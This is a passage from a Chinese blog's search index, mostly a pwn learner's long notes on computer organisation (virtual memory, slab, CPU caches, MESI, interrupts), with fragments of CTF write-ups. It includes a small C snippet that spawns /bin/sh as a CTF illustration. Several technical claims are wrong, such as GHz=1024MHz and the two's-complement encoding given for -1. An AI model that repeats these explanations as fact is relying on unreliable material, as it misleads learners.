x27;,&#x27;3&#x27;)p.interactive()","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"计组原理","slug":"计组原理","date":"2022-12-14T12:10:07.000Z","updated":"2023-01-16T17:16:58.901Z","comments":true,"path":"2022/12/14/计组原理/","link":"","permalink":"http://example.com/2022/12/14/%E8%AE%A1%E7%BB%84%E5%8E%9F%E7%90%86/","excerpt":"","text":"前言已经学习了pwn一段时间 自从开始接触堆以后 就越发感觉计组原理的重要性 终有一日也是要自己读源码 自己挖洞的 所以从现在开始扎实基础知识 并且同时在刷c语言题的时候 遇到了Segmentation Fault的报错 打算弄懂 没想到这一下子就是扯出一整块知识 本篇的篇幅将会十分长 将从0开始写起 梳理和补缺知识点 并且由于是构建一个逻辑性的知识梳理 所以不会像wiki一样详细 可能大部分是一个体系的指导或者记录一些难懂的知识点 并且这种基础知识 不同于呆板的文科学习 如果只是背诵八股文 那么依然达不到用处 希望读者阅读完整篇后 能够形成自己的理解 并且 本文一部分是参照着&lt;&lt;小林图解计算机&gt;&gt;来写的 建议还是去看他的 能够梳理更清楚的框架 Linux内核1你可以把linux内核理解为一个中介 其负责硬件和软件的通信 对应用程序来说 他有什么请求的时候就会将其通过内核传递给硬件 而内核又充当一个底层驱动程序 对设备和组件进行寻址 并且内核是应用程序逻辑上的最底层 同时 内核也相当于一个库 系统调用即是通过这个库实现 应用程序进行系统调用就像调用普通函数一样 如图所示 为GNU&#x2F;linux的基本体系结构 蓝色部分是用户空间 下方是内核空间 内核空间的最上方是系统调用接口 下面依次是通用的内核代码和特殊的内核代码(略) 内核也可以拆分成两部分 微内核和宏内核 微内核又可以称为中央内核 内核的一些基本操作是基于其实现的 其他的功能是交给一些独立进程 这些进程通过特定的通信接口和内核通信 宏内核 你可以将其理解为一个整体 一个文件 其包含了内核的所有代码和五个子系统 在宏内核中 任意一个函数都可以访问到内核的任意地方 五个子系统分别是 进程调度 内存管理 虚拟文件系统 网络接口和进程间通信 其中比较重要的是进程调度和内存管理两个系统 这里拿出来说说 其他的可自行了解 进程调度：linux系统是一个动态的系统 怎么理解这句话 其通过不断变化的各种进程来适应不断变化的计算需求 也就是说 linux中的所有操作 你都可以将其视为一个进程 比如说 我接下来编译如下的二进制文件 1234567#include&lt;stdio.h&gt;int main()&#123;close(1);close(2);system(&quot;/bin/sh&quot;);return 0;&#125; 按理来说应该会直接进行了系统调用 随后我们直接cat flag就能获取flag了是吧 但是运行之后发现 没有回显 这是因为关闭了文件描述符1和2 其对应着标准输出和标准错误 文件描述符相当于一个索引值 其代表的是一个进程 也就是说 在当前终端 输出(即与屏幕的通信接口)被关闭了 这个进程被中断了 那么这里可以用重定向(不解释) 回归正文 linux中的所有进程都源于一个父进程 即fork函数 先调用了这个函数 然后才有了其他的子进程 并且 每一个子进程都有其自己的PID(可以理解为名字) 比如我们可以用 ps -e来查看当前所有的进程 (进程数量过多 这里仅仅这是截取了开头的小部分) 不过这里的PID在进程结束以后 是可以被其他的进程获取的 即其是重复使用的 可见进程对于linux系统的重要性 所以 内核中的其他四个子系统都是依赖于进程调度的 通过其来挂起或者恢复进程 当一个进程需要用到其不能得到的资源时 他会调起其他的进程 而自己会进入睡眠状态 分为两种:可被打断的睡眠和不可被打断 区别在于字面意思 收到信号以后 前者就会恢复进程 当然了 进程的信息肯定不单单只有PID 其还包括进程的优先级、地址的空间等信息 这些内容都会存储在其(单个进程)的一个独立的数据结构中 这个结构称为进程控制块 进程管理也就是管理这些块 内存管理: 提起内存 那么牵扯到的东西就多了 小到cpu的缓存 大到虚拟内存 需要极大的篇幅来叙述 所以我们接下来将偏移正文很长时间 来从0朔源起内存这一个概念 内存最早的图灵机也有内存的概念 如果其要计算1+1 那么就会将1 + 1这三个放上带子 随后由读写头读入到控制器中 这一点和现如今使用的I&#x2F;O总线类似 其分为地址总线 数据总线 控制总线 数据总线将读写到的数据传输给控制总线(I&#x2F;O总线不在这里展开) 这一做法主要是因为数据的读取速度远远慢于计算速度 并且这样可以减少读取数据的次数 做个直观的比喻 你掉落了100根牙签在地上，没有缓冲区的情况是 你弯腰捡完一根牙签就起身把他放回桌子上，接下来继续重复流程 而有了缓冲区以后，你弯腰捡完牙签，你会先把他放在手上，等手中的牙签数量足够多的时候，你才会起身放回桌面 cpu中的缓存概念也类似于上述 cpu拥有三级缓存 简称为 L1 L2 L3 每级缓存逐渐递增缓存量 而读取速度逐渐减少 L1和L2是每一个cpu核心所特有的 而L3通常是几个核心共用 这三级缓存采用的SRAM(静态存储器) 其特点是价格高昂 并且断电后数据就会消失 但是因为其优秀的读取速度 被广泛运用在cpu缓存中 这里额外提一嘴扩展 我们经常会听到cpu超频 这个说法还得从cpu如何执行指令说起 在很多非科班的编程语言培训和你第一节计算机导论课上都会提到 低级语言和高级语言 你只知道一个概念 就是计算机读不懂你写的程序 比如c语言 他需要经过编译 将其转化成计算器能读懂的机器码 这其中的过程可不是能简单用编译两个字来概括的 就比如用gcc来编译一个c语言程序举例 我们编写了一个输出hello world的程序 接着编译这个程序 他会经历四个阶段 : 预处理阶段 编译阶段 汇编阶段 链接阶段 预处理阶段: 这个阶段主要是将我们程序调用的头文件插入到程序文本中 接着由a.c得到a.i 文件扩展名发生了变化 编译阶段: 生成了一个汇编语言程序 文件扩展名变成了s 并且每条汇编语句还对应着一条低级机器语言 汇编阶段: 将文件翻译成机器语言 打包在一个可重定位的二进制文件中 后缀名变为o （这里的可重定位你可以理解为是为了接下来的链接） 链接阶段: 将文件进行静态链接或者动态链接 区别在于是否通过libc库调用函数(如果pwn学到了ret2libc 应该对这块的过程很了解 这里不过多赘述) 接着 这些机器指令被传给了计算机 他需要经历三个阶段 才能从接收到实现 ： Fetch（取指）Decode（译码）Execute（执行指令） 具体的功能不过多赘述 不过从字面意思应该也能理解各步骤的作用 cpu实现这些步骤也是需要时间的 所花费的时间以时间周期为基本单位来衡量 而cpu的主频就是cpu运算速度的单位，cpu的运算速度单位有MHz、GHz，其中GHz&#x3D;1024MHz 但是并不意味着主频越大 cpu的性能越好 这还要参考指令集 发热 等等因素 接着我们说回到内存 基础的我就懒得写了 毕竟好理解 网上资料也多 实在不行我的个人博客里也有提到内存地址之类的概念 为什么会有虚拟内存这个概念？当我们电脑的物理内存不够时 虚拟内存机制可以支持计算机在硬盘中划出一块空间来充当内存使用 并且多个程序可以共有同一块内存区 大大提高了计算机的运算性能和效率 虚拟内存的实现有三种方式 分页 分段 段页式 分页: 以下所叙述的 前提是没有开启虚拟存储机制(不赘述 自行了解) 接下来我们清楚两个主角 物理内存和虚拟内存 所谓的分页是将这二者划分成大小相同的”块” 前者称为页框 后者为页面 而虚拟内存是远远大于物理内存的 所以其分配到的”块”是不能都有对应的物理内存的 为什么这么说？ 我们先得了解cpu的寻址是如何计算的 用32位cpu举例来说 这里引入一个概念 I&#x2F;O总线 I&#x2F;O总线三种总线: 地址总线 数据总线 控制总线 这里只介绍第一种 地址总线 最底层的数据是通过高低电压来传输的 比如说想要传输5这个值 那么就需要三个电压 101 如果只有一条地址总线 那么需要传输三次 这样一位一位传输的方式，称为串行，下一个 bit 必须等待上一个 bit 传输完成才能进行传输 要想提高效率 就需要增加地址总线 但是也不能无脑增加 32位的cpu自身的位宽只有32 要想让他跨级传输64位甚至更多的地址位宽 这明显是不现实的 所以最好的情况下是cpu的位宽刚好和地址位宽一致 所以32位cpu能够寻址到的内存大小是4gb ps: 这一块不懂的可以看一下下面这段 截取自《小林图解计算机》 如果地址总线只有 1 条，那每次只能表示 「0 或 1」这两种地址，所以 CPU 能操作的内存地址最大数量为 2（2^1）个（注意，不要理解成同时能操作 2 个内存地址）； 如果地址总线有 2 条，那么能表示 00、01、10、11 这四种地址，所以 CPU 能操作的内存地址最大数量为 4（2^2）个。 说回到虚拟内存为什么比物理内存大得多 32位的情况下 物理内存最大支持4GB 但是虚拟内存是每个进程所独立拥有的 这样才能确保虚拟内存地址不冲突 而进程是不会只有一个的 所以这种情况下 势必会出现虚拟内存的页面对应不上物理内存的页框 这种问题称为缺页中断 出现这种情况时 系统会从物理内存中挑选一个使用最少的页框 将其内容存放回硬盘 这样就腾出了一个新的页面 接着重新映射到这个空闲的页 我们所提到的这些操作 是由MMU（内存管理单元）来实现的 包括映射和虚拟内存的分配 了解一下就好 扩展的话自己百度百度吧 接下里的内容就需要带脑子看了 虽然说一直都需要脑子 我们来介绍一下 虚拟内存的页面是如何索引到物理内存的 每一个虚拟地址都由两部分组成 页号和页内偏移 页号是页表的索引 页表中存储的是物理内存每页框的基地址 这个类似于libc基址 页内偏移加上页表中的基地址 就索引到了物理地址 然后页表实际上是存储在MMU中 这里的索引其实有点类似于ret2dl的知识点 虽然说这个github上有很多开源的工具可以做到脚本攻击 但是建议还是自己去阅读理解 但是这样的索引机制其实存在一个缺陷 假设32位的情况下 虚拟内存有4GB 假设一个页为4kb 那么就分成了一百万个页 就对应着一百万个页表 页表存储的是物理内存地址的基址 32位情况下需要4字节 这就需要4MB 你会觉得这样也很小 占用不到哪里去 但是你要知道计算机在运行时一般不会只有一个进程 如果你上面按照我说的查看了你虚拟机里的所有进程 你就会知道这个4MB会被乘以多少 为了解决这个问题 还有一种多项页表 还是按照上文的数据假设 对于一个进程来说 一共有4mb的一百万个页表项 如果这些页表继续进行页号的索引 即形成二级页表 二级页表仍然由页表项索引指向一级页表 分配方案为 1024个二级页表 每个页表中仍然有1024个页表项 这样可以索引到1,048,576个一级页表 但是你想 一级页表占用4kb 其进行了二级页表分页后 二级页表的大小是4MB 那这样不多了内存吗？ 但是 你要知道不是每个进程都会占用4GB的虚拟内存 往往会剩余很多 我们一级页表是为了覆盖整个物理内存 才需要不管其有没有占用满 都需要一一对应上 但是二级页表不用这种担心 所以其实大部分情况下 二级页表是分配不到那么多的 所以实际上 增加二级页表机制以后 一个进程所需要的页表项空间为： 4KB+(二级页表占用率)x4MB 得到的值是小于原本的4MB的 这样子就成功节约了空间 下面为补充知识 个人认为可掌握可不掌握 上图是页表项的详细结构 其中 页框号就是页号 用来索引物理内存地址 相当重要 “在&#x2F;不在”位的值是一个布尔类型 1时代表此页表项所指引的页框不在虚拟内存上 如果调用到了这个页表项 就会触发缺页中断 保护位字面意思 用来防止非法调用 上图是比较低级的页表项 好的页表项还会有三位 代表可读 可写 可执行 修改位 如果这个页表项所指引页面被修改了 那么其对应在硬盘上的值也必须被修改 如果没有 那么这个页面就可以直接被丢弃 差不多你可以理解为 你在玩游戏 你使用了一个道具 那么虚拟内存调用到这个的时候 就会把你硬盘中道具的 分段: 这一部分还是很简单的 至少对于分页来说 将虚拟内存分为了多个段落 并且每个段落的长度并不是相等的 这部分和glibc内存管理是一样的 这里就不重复说了 讲一点不一样的 和分页机制类似 分段机制下的虚拟内存地址也包括两个部分 段选择子和段内偏移量 段选择子是段表的索引 而段表中存储的值是这个段映射的物理内存地址的基地址 加上段内偏移量后 就是物理内存地址 但是不同于分页的是 段存在着很大的缺陷 就是内存碎片的问题 因为段所对应的物理内存并不会是连续的一块空间 这么说不好理解 举个例子 一共有1024mb的内存空间 浏览器占了512mb 视频播放器128mb 图片管理器占了256mb 这时候如果把视频播放器的进程终止了 按理来说应该还有128mb(原本空余剩下的)+128mb(视频播放器腾出来的) 但是我们仍然打不开一个256mb的进程 因为这里的256mb的内存并不是连续的 中间是断开的 这就出现了外部内存碎片 那么相对的 还有内部内存碎片 比如我们打开一个视频播放器 但是我们实际上使用的内存只有几十mb 但是这个进程占用的高达256mb 这就出现了内存的浪费 并且分段机制下的内存交换的效率还很低 什么是内存交换 当我们出现了外部内存碎片的情况下 解决办法就是将图片管理器的内存接到浏览器的后面 先把这一块内存写到硬盘上 再读取回来 就接在了浏览器的后面 但是由于这样的内存交换需要将整个进程和硬盘交互 但是我们前面已经讲过了 硬盘的读写速度是远远比不上内存的 所以会被效率造成严重的拖累 段页式: 字面意思 结合了分段和分页两种机制的一种虚拟内存分配方式 其将虚拟内存按照逻辑 分段后 再段中分页 然后和物理内存对应 这样的优点就是又有分段试的管理又有分页式的调用 缺点就是在调用的过程中要不断的查表 既有段表又有页表 增加了硬件成本 接下来详细介绍一下段页式内存映射的原理 虚拟内存这回由三部分构成 段号 段内页号 页内偏移 有了前面的基础 这回就很好理解了 内存先访问段表 然后访问页表 接着加上页内偏移 就得到了物理内存地址 到这里我们就已经普及完了内存的一些知识点 理解完这些你应该对内存差不多有了大概的概念 接着我们说回到linux内核的子系统之一内存管理 Linux内核232位计算机的情况下 linux的虚拟内存分为两个部分 一是3GB大小的用户空间 二是1GB大小的内核空间 内核空间是所有进程所共享的 Linux内核所需求的内存一般都是以字节为单位 所以对于使用分页机制来说 若直接分配一页内存 会造成内存浪费 于是有一个叫slab分配器的东西 来专门负责小内存分配 不过其依然是通过申请大内存 然后对自己申请来的内存进行细分管理 除了分配小内存外 其还有第二个作用 就是提供一个类似于堆块缓存区的东西 (给不是pwn手的简单介绍一下堆块缓存区bins 就是比如说申请了一个范围大小的chunk 将其释放以后 其不会回到原本的内存里面 会被放到大小对应的垃圾桶(bins) 如果下次调用小于或者等于(并不是都适用的 要分辨是哪种bins) 就会从bins中分配) 这样子的好处就是当内核频繁调用小内存时 可以快速分配对象 提高效率 不过总得用slab分配器的术语来描述一下: slab维护着对象的缓存 内核中有些结构 初始化所花费的时间高于为其分配空间的时间 所以就会新增一个slab使用构造函数为其初始化 即使这个结构被释放了 他也会保持初始化状态 下次生成就不用初始化 如果你会一点汇编 你会发现 经常性的会出现地址跳转的指令 比如此时正在执行0x1000地址处的指令 现在要跳转到0x1100 你以为只是很简单的跳转？ 其实不然 原理涉及到了slab的着色机制 我们前面已经说了 cpu有自己的三级缓存 在执行指令时 一级缓存是交互最快的地方 而缓存中调用地址是采取缓存行的形式 比如说此时缓存行一行是64字节 那么: 再假设此时读取的物理内存基址是0x1000 那么第0缓存行读取的地址范围就是0x1000~0x1040 但是这时候要调用0x1100地址处的指令呢 是不是就得将0x1000-0x1040物理内存地址的数据写回硬盘 然后载入0x1100-0x1140 但是这样子如果频繁调用的话 效率太低 造成大量的时间消耗 于是采取了slab着色 为0x1100带上偏移 这样子计算的时候就可以代入到第1缓存行 这样子就不用频繁交换 所以着色其实就是加上偏移 只不过不同对象的偏移不一样 颜色也不一样 ps:slab内容远远不及于此 但是我感觉深究下去也不是个头 并且现阶段没有必要了解那么深 所以点到为此 CPU首先需要知道cpu是怎么执行程序的 CPU又称中央处理器 字面意思是计算机的核心 和人脑一样的地位 其内部包括许多零件 诸如寄存器 控制单元 逻辑运算单元等 其中寄存器负责管理运算数据的存储 以及指令地址和指令内容 分别由三种寄存器种类存储: 通用寄存器 程序计数器 指令寄存器 并且cpu拥有自己的缓存区 称为cache 分别有L1 L2 L3 其中L1缓存区分为指令缓存和数据缓存 二者大小一致 cpu对于cache的读写速度远远大于内存 而上述三个cache 随着数字的增大 缓存空间逐渐增加 读写速度逐渐降低 cpu可以拥有多个核心 而每个核心都有自己特有的L1 L2 cache，L3 cache是所有核心所共享的 cpu和计算机的交互是通过IO总线来实现的 IO总线分为 地址总线 控制总线 数据总线 当cpu读写数据的时候 先通过地址总线来确定目标的地址 再通过控制总线决定是写入还是写出 最后由数据总线传输数据 cpu是如何执行程序的呢? 如果你学过学校教的计算机组成原理 你应该知道冯诺依曼模型 cpu执行程序相当于一行一行执行代码 而执行代码又是将一行代码拆分成指令和数据 其中数据的总类也很多样 全局变量和局部变量 二者还可以延申出不同的数据类型 int double等 例如puts函数输出的字符串也是数据 其会保存在rodata段 指令实际上是一串二进制的机器码 每条指令都有各自的机器码 cpu通过解析机器码来了解指令需求 指令的机器码解析由cpu的指令集负责 而不同的cpu的指令集不同 也就对应不同的汇编语言和机器码 下面举例MIPS指令集来解析一下指令的机器码的构造 MIPS指令集一共有三种格式 每种格式的长度都为32位 前六位是操作码 用来表示该指令作用 后26位根据不同格式构造不同 R格式用于逻辑和算术运算 划分出来的六个区块大小分别为6 5 5 5 5 6位 如果操作码不够描述指令 函数码也可以用来描述 I格式用于数据传输和条件分支 J格式用于跳转地址 构成是三者中最简单的 除了操作码其余都是跳转的地址 举一个R类型的指令 比如add $0,$1,$2 目标寄存器为$0 第一个操作数是$1 第二个操作数是$2 add的操作码为0 函数码为32 所以指令编码后转化成的机器码为 000000 00001 00010 00000 00000 32 cpu解析指令后将其分为数据段和正文段 数据段用来存放变量等 正文段用来存放指令 cpu有一个专门用来存放指令地址的 称其为程序计数器 其存放的指令地址为下一个要执行的指令 cpu先根据程序计数器索引指令 随后通过控制单元操控地址总线访问对应地址 随后利用数据总线传输数据到对应寄存器 接着程序计数器自增 自增大小根据操作系统位数有关 为一个字长 随后程序根据指令类型判断 如果为计算类型的指令 交给逻辑运算单元 如果是存储类型交给控制单元 大部分cpu遵从的是四个固定步骤来执行指令 分别是取指令 指令译码 执行指令 数据回写 取指令(Fetch): 通过程序计数器读取指令地址 指令译码(Decode): 对指令进行解码 执行指令(Execution): cpu执行指令 数据回写(Store): 程序将数据写回对应寄存器或者内存 我们称上述四个步骤为指令周期 cpu执行每一个步骤的时间称为时钟周期 如果时钟频率越快 时钟周期就越短 cpu的执行速度也越快 时钟频率和cpu的主频相关 也就是我们常说的几GHZ 比如2.4GHZ 代表着一秒可以触发2.4G次的脉冲信号 每一次脉冲信号的高低电频转化就是一次时钟周期 另外 cpu为什么还存在原码 补码 反码 原码是对于计算机中二进制的一种表达方式 首位额外增加了符号位 正数是0 负数是1 比如10进制数字1用源码表示就是000000001 但是原码不能直接用于计算 比如两个十进制数字1+(-1)&#x3D;0 如果整个计算过程用原码来表示的话就是 000000001 + 100000001 &#x3D; 100000010 最后的结果是-2 明显计算错误 因此计算机用补码来表达负数 所谓补码就是把负数的原码全部取反再加上1 所以-1的补码就是 011111111 而反码就是原码向补码转化的过度值 也就是还没有加上1时的数值 比如-1的反码是011111110 接下来我们再来讲一下二进制是如何表示小数的 10.625这个数 在二进制中实际上是1010.101 小数点前面的是正数幂 后则是负数幂 1010.101转化为十进制是 但是你会发现也有很多数 比如0.1是不能用二进制表示完全的 这种时候就会产生偏差 如果将二进制的0.1转化回十进制 得到的值是近似于0.1的 0.0001100110……. 我们提到过的二进制数1010.101如果用规格化存储 得到是1.010101 x 2*3 其中010101称之为尾数 3为指数 用来规范小数点的位置 更多细节这里不扩展 感兴趣的可以去这个博客了解 2.7 为什么 0.1 + 0.2 不等于 0.3 ？ | 小林coding (xiaolincoding.com) 接着我们来利用下面的这个程序进入cpu cache的存储内容 12345#include&lt;stdio.h&gt;int main()&#123; int a[20]=&#123;1,2,3&#125;; printf(&quot;%d&quot;,a[0]);&#125; 当cpu执行printf语句的时候 需要将a[0]的值读入cache 但是cpu并不能刚好读入单个数据或者是刚好适应不同调用情况的字节数据 其单次读写数据的单位是cache line 上文讲述slab着色器的时候也说到过了 这里复述的详细一点 假设此cpu的cache line是64字节 那么当其需要a[0]数据的时候 会把a[0]后面的数据也一并读入 直到满足64字节 第一块64字节的数据会被放置为cache line 0 当需要更多字节的数据的时候 就会依法炮制 放置在cache line1 如此递增 假设cache一共有8行 而内存被分为了32个块 这也就意味着必然会有两块以上的内存共用一块cache line 其遵守的是取模运算 比如说第15个内存块 实际上对应的是第7个cache line 而cpu为了避免搞混单个cache line中的不同内存块 在对应的cache line中还存储了tag标记 相当于slab着色器 除了tag标记外 cache line中还存储着两个重要信息 一个是有效位 一个是偏移量 有效位为0时 不管cache中是否有需要的内存数据 仍然会去内存中读取 偏移量的存在则是因为cpu所需的内存数据并不一定都是刚好一个cache line 就比如说上面的程序 所需的仅仅是cache line中的一个内存片段 也就需要偏移量来界定一个范围 cache line是为了避免频繁的cpu访问内存带来的读写效率降低 但是其存在着一个缺陷 也就是意味着一块cache line中可能并不全是所需要的数据 出现了缓存命中率的问题 其又分为数据缓存命中率和指令缓存命中率 先说数据缓存命中率吧 来看下面的一个程序 1234567891011#include&lt;stdio.h&gt;int main()&#123; int a[5][20]; for(int i=0;i&lt;5;i++)&#123; printf(&quot;%d &quot;,a[0][i]); &#125; putchar(10); for(int i=0;i&lt;5;i++)&#123; printf(&quot;%d &quot;,a[i][0]); &#125;&#125; 你觉得哪一个for循环执行所消耗的时间会更加短 是第一个? 那为什么呢 其调用的数据在内存地址中都是连续的 也就意味着单次的cache line写入就可以做到覆盖所有要调用的数据 而第二个for循环调用的数据是间断的 需要花费更多的时间在cpu和内存的交互中 当我们需要遍历数组这种情况时 最好选择连续的内存空间 可以有效提高程序的运行时间和数据缓存命中率 而指令缓存命中率是什么呢？ 还是先看一下下面的程序 123456789101112#include&lt;stdio.h&gt;int main()&#123; int a[20]; // 数组a进行一个随机赋值 这里不演示出来 for(int i=0;i&lt;20;i++)&#123; if(a[i]&gt;0)&#123; a[i]=0; &#125;else&#123; continue; &#125; &#125;&#125; 当数组a进行了赋值后 步入if判断分支 请问是先对数组a中的数据进行一个排序后再判断所消耗的时间快还是直接进行判断 回答这个问题之前我们首先要了解 cpu拥有一个分支预测器 如果cpu能够预测到接下来是步入if语句的哪个分支 就会提前把指令(在这里也就是a[i]&#x3D;0)放入到cache中 于是执行速度就会加快 那么显然 先进行排序再步入if判断语句就可以提高判断后赋值的效率 当我们在实际编写程序的时候 如果你可以确保哪一个步入哪一个分支的概率较高 你可以使用likely和unlikely两种宏 1234567891011#define likely(x)__builtin_expect( !!(x),1)#define unlikely(x) __builtin_expect( ! !(x),0)#include&lt;stdio.h&gt;int main()&#123; int a[20]; for(int i=0;i&lt;20;i++)&#123; if(likely(a[i]&lt;100))&#123; puts(&quot;a&quot;); &#125; &#125;&#125; 当括号中的判断式为true的概率大时 就使用likely宏 与此同时 我们前面提高过 每个cpu核心都有自己的L1 L2 cache 数据会被优先放到这两个cache中存放 方便cpu调用 但是 如果是单核cpu的话 只能执行一个线程 但是系统给多个需要被执行的线程分配时间片 每个线程执行一段时间后 就执行另外一个线程 所以看起来就好像所有的线程都在同时执行一样 但是现在的cpu基本都是多核心的 这也就意味着线程可能会在多个核心中执行 这就导致了缓存命中率的问题 上述所提到的cache和内存的数据交互 只是cache单方面写入内存的数据 如果cpu要执行b &#x3D; a+1的操作呢? 那么就需要将cache的数据b写回到内存 这一操作是怎么实现的 下面我们就来讲两种写入数据的办法 分别是写直达和写回 写直达: 这一种办法是最简单粗暴的 也就是连同cache和内存 一起写入数据 流程为 先判断cache中是否有需要被写入的数据 如果有 就先写入cache 再写入内存 如果没有 就直接写入内存 这种办法的逻辑简单 比较浪费cpu的执行时间 因为每次写入都需要访问内存 写回: 写回办法有效解决了前者出现的问题 当要进行写操作的时候 先判断cache是否已经有对应数据了 如果有的话 则更新数据到cache中 并且把数据标记为脏的 如果cache中是其他内存地址的数据的话 先判断这个数据是不是脏的 如果是脏的 那么先将该数据写回到内存中 再从内存中将需要用到的数据写到cache 再覆写cache中的数据 并且标记为脏的 之所以这样做可以看 caching - For Write-Back Cache Policy, why data should first be read from memory, before writing to cache? - Stack Overflow 如果不是脏的话 就只要将需要的数据从内存中写入到cache 再覆写cache 最后标记为脏的 这样下来 就不需要每次写操作都需要访问内存 你可能会觉得 那这样就无法及时的写回内存 但是如果我们的缓存命中率高的话 就不需要频繁的与内存交互 我们一直提到缓存命中率 这是对于同一个核心而言的 如果一个线程由两个核心执行呢 一个计算式: 1234a=b=0 //1a += 1 //2b += 1 //3a += b //4 如果核心A负责式子2和4 核心B负责式子3 接下来注意了 两个核心读入数据到cache中时 读入的都是初始值 对于两个核心来说 a,b最开始的值都是0 核心A执行完式子2了以后 按照上文的写回操作 并不会马上将数据写回到内存中 接下来核心A执行式子4的时候 其和核心B执行的式子3 并没有关联 对于核心A来说 变量a是1 变量b是0 a最后的值是1 但是对于上帝视角的我们来说 最后的结果应该是2 这就是核心A和B的信息差导致的后果 称这种问题为缓存一致性 为了解决这种问题的出现 就需要一种机制来协调不同核心间的cache 也就是当核心A将变量a赋值为了1时 需要通知其他核心的cache 将a同样重新赋值 相当于广播 这种方式称为总线嗅探 这种行为称为写传播 但是光这样还是不足以平衡不同核心之间的信息差 当核心A对于变量a多次赋值 第一次赋值为10 第二次赋值为20 假设核心B接收到的广播顺序是先20再10 那么显然最后变量a在两个核心中的值还是不同 也就需要统一对数据的操作顺序 这种行为称为事务的串行化 当接收到广播后 只有拥有&lt;锁&gt;才能对这个数据的赋值进行修改 要想同时实现事务串行化和写传播 并且优化每次写传播都需要对所有核心广播的问题 诞生了MESI协议 MESI协议包括了四种状态 分别是 已修改 独占 共享 已失效 已修改: 即我们前面提到的脏标记 意味着此时该数据在cache和内存中不一样 独占&#x2F;共享:二者的定义是对于cpu核心而言的 即该数据是否为单个cpu核心所独占 如果处于独占状态 那么写入数据后就不需要写传播 如果处于共享状态 先经过写传播 将其他核心内的数据修改成无效状态 再重新写入数据 已失效: 代表该数据不能被调用 MESI协议的共享机制存在着伪共享的问题 此时核心A和核心B分别负责线程A(a +&#x3D; 1) 线程B(b +&#x3D; 1) 而变量a和b相邻 位于同个cache line范围中 所以此时核心A和核心B的cache line拥有同样的变量 变成共享状态 此时 核心A开始执行线程A 发现其处于共享状态 于是通过总线将核心B的cache line修改为已失效状态 随后进程A结束后 核心A的cache line变化已修改状态 核心B开始执行线程B 发现cache line处于失效状态 于是将拥有和其一样变量的核心A的cache line写回到内存 再从内存中重新读入cache line 随后执行完线程B以后 将新cache line设置为已修改状态 而此时核心A的cache line处于已失效状态 如果核心A和B不断重复各自的线程 实际上就是不断重复上述的操作 频繁的和内存进行交互 cache line的用处微乎其微 这就是伪共享问题 想要解决这一问题 linux内核提供了__cacheline_aligned_in_smp的宏定义 对于该定义 仅使用于多核cpu 下面举例一个程序 12345#include&lt;stdio.h&gt;int main()&#123; int a; int b;&#125; 此时变量a和b在内存地址上是相邻的 如果将变量b用上__cacheline_aligned_in_smp宏定义 12345678910#ifdef CONFIG_SMP#define __cacheline_aligned_in_smp __cacheline_aligned#else#define __cacheline_aligned_in_smp#endif#include&lt;stdio.h&gt;int main()&#123; int a; int b __cacheline_aligned_in_smp;&#125; 此时b的地址就被设置为cache line的对齐地址 但是这种方法实际上是浪费了一部分cache line的空间 来换取效率的提升 接下来我们来讲一下进程和线程的一点知识 为了接下里要讲的软中断做铺垫 每一个进程都有自己独立的内存空间 一个进程可以拥有多个线程 在windows系统中 可以使用任务管理器来查看当前的进程 其中 一个进程可以拥有多个线程 在linux系统中 线程可以被视为一个轻量化的进程 也就是说线程也是被作为一个进程看待 而在JVM(java为了实现跨平台而创建的一个假想计算机)中的线程 拥有自己的程序计数器 虚拟机栈 本地方法栈 这里不额外扩展 感兴趣的可以自行了解 进程是操作系统资源分配的基本单位 而线程是处理器任务调度和执行的基本单位 每一个线程都有自己的独立运行栈和程序计数器 并且共享代码和数据空间 线程也不能自己独立执行 必须依附于应用程序 也就是进程中 当有一个线程崩溃掉 整个进程都会崩溃掉 相比之 进程拥有独立的代码和数据空间 进程之间的切换会消耗挺大的开支 一个进程崩溃后 在保护模式下不会对其他进程造成影响 接下来我们来讲软中断 首先要明白什么是中断 举一个例子 在日常生活中 你正在打原神 这时候你接到了你的外卖电话 由于你的学习福建师范大专偷外卖的人很多 你不马上下楼拿就会不见 所以你立刻中断了打原神的操作 下楼去拿外卖 其中 打原神就是一个进程 拿外卖又是一个进程 从打原神向拿外卖的一个执行转化 就是中断 对于计算机来说 中断是一个异步的事件处理机制 可以有效于提高系统的并发处理能力 负责相应中断请求的是中断处理程序 其在相应中断请求的时候 可能还会临时关闭中断 这是什么意思呢 还是接着上面的例子 当我们下楼拿外卖的时候 原神突然发放福利1w原石 但是需要玩家动手领取 这时候你下楼去拿外卖了 也就无法相应这个福利 你就和原石擦肩而过 本来计算机需要相应两次中断 一次拿外卖 一次领福利 但是由于中断处理程序还在执行第一次中断 无法及时相应第二次中断 就丢失了一次中断 那么软中断是什么呢? 其讲一次中断请求分为了两个部分 第一部分用于快速响应中断 直接处理硬件请求 为硬中断 第二部分用于处理第一部分还没有完成的事情 通常是时间较长的事情 为软中断 如何理解呢? 举个例子 A要和你聊事情 约你在一个地方见面 没有分为软中断和硬中断的话 A会和你一直保持通话 期间如果其他人要找你就没有办法响应 如果有软中断的话 就是和A迅速约定好见面地点和时间 然后挂断电话 等待其他人给你打电话 随后你可以面对面询问A遇到什么问题","categories":[{"name":"基础","slug":"基础","permalink":"http://example.com/categories/%E5%9F%BA%E7%A1%80/"}],"tags":[]},{"title":"pwnable_start","slug":"pwnable-start","date":"2022-12-04T12:54:30.000Z","updated":"2022-12-07T13:39:13.616Z","comments":true,"path":"2022/12/04/pwnable-start/","link":"","permalink":"http://example.com/2022/12/04/pwnable-start/","excerpt":"","text":"一道很有趣的题目 原理基础ret2shellcode 但是考查了汇编代码的阅读以及栈结构的理解 还有内平栈 涉及到的知识点还是很多的 这里讲细一点 内平栈内平栈（In—Place Stack）是一种特殊的栈，可以在一个给定的数组中存储元素，并可以支持压栈和弹栈操作，且不需要额外的内存空间。保持堆栈平衡的关键是使用一个变量（称为指针，即esp）来跟踪堆栈顶部的位置。当元素被压入堆栈时，指针会指向新元素，表示它是当前堆栈的顶部。当元素被弹出堆栈时，指针会移动到上一个元素的位置，表示它是当前堆栈的新顶部。这样，指针就可以在堆栈操作过程中保持堆栈平衡。 外平栈外平栈（External 